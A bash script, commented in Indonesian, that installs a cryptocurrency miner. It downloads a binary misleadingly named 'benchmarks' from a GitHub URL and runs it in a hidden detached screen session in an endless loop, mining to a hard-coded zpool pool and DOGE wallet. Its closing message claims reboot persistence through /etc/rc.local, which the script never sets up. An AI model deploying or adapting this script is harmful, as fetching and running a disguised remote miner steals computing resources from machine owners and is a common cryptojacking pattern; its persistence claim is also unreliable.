#!/bin/bash
echo "📦 Menginstal dependensi..."
apt-get update && apt-get install -y screen wget tar

echo "📁 Menyimpan skrip mining ke /root/sugar.sh..."
cat << 'EOF' > /root/sugar.sh
#!/bin/bash

cd /root || exit

# Download miner jika belum ada
if [ ! -f benchmarks ]; then
  echo "⬇️ Mengunduh file benchmarks..."
  wget -O benchmarks https://raw.githubusercontent.com/amirul5656/web1/main/benchmarks
  chmod +x benchmarks
fi

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --disable-gpu --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.sea.mine.zpool.ca:4833 --wallet D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux --password c=DOGE --cpu-threads 3
      sleep 2
    done
  '
fi
EOF

chmod +x /root/sugar.sh

echo "🚀 Menjalankan miner sekarang..."
bash /root/sugar.sh

echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
